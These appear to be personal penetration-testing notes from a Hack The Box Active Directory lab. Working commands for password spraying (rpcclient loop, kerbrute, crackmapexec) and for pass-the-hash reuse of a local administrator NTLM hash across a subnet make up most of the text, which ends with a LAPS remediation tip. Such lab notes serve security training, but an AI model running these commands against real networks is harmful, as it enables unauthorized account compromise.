# Password Spraying
checklist:
```markdown
1- userlist should be ready at this stage kerbrute did its job
2- password policy obtained 
```

lets spray
#### Using a Bash one-liner for the Attack
```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

#### Using Kerbrute for the Attack
```bash
AhmaDb0x@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 var.txt  Welcome1
```
---

#### Using CrackMapExec & Filtering Logon Failures
```bash
AhmaDb0x@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u jsmith.txt -p Welcome1 | grep +
```

#### Validating the Credentials with CrackMapExec
```bash
AhmaDb0x@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

---

# Local Administrator Password Reuse

The `--local-auth` flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout.

```bash
AhmaDb0x@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

`noisy and is not a good choice for any assessments that require stealth.`

# remediation
using the free Microsoft tool [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) to have Active Directory manage local administrator passwords and enforce a unique password on each host that rotates on a set interval.

